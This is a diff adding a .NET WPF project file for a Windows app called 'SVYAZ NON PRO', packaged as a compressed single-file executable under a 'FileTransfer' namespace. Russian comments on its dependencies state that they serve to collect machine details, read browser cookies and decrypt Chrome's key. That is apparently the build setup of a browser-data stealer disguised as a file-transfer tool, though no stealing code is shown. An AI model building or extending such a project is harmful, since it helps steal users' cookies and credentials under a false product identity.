@@ -1,0 +1,35 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>net8.0-windows</TargetFramework>
+    <Nullable>enable</Nullable>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <UseWPF>true</UseWPF>
+    <AssemblyName>SVYAZ NON PRO</AssemblyName>
+    <RootNamespace>FileTransfer</RootNamespace>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <Version>7.3.0.0</Version>
+    <FileVersion>7.3.0.0</FileVersion>
+    <Company>SVYAZ</Company>
+    <Product>SVYAZ NON PRO</Product>
+    <Description>SVYAZ NON PRO</Description>
+    <Copyright>SVYAZ</Copyright>
+    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
+    <SelfContained>true</SelfContained>
+    <PublishSingleFile>true</PublishSingleFile>
+    <IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>
+    <EnableCompressionInSingleFile>true</EnableCompressionInSingleFile>
+  </PropertyGroup>
+  <ItemGroup>
+    <Resource Include="app.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <!-- WMI для получения характеристик компьютера -->
+    <PackageReference Include="System.Management" Version="8.0.0" />
+    <!-- SQLite для чтения кук браузеров -->
+    <PackageReference Include="Microsoft.Data.Sqlite" Version="9.0.3" />
+    <!-- DPAPI для расшифровки ключа Chrome -->
+    <PackageReference Include="System.Security.Cryptography.ProtectedData" Version="8.0.0" />
+  </ItemGroup>
+</Project>
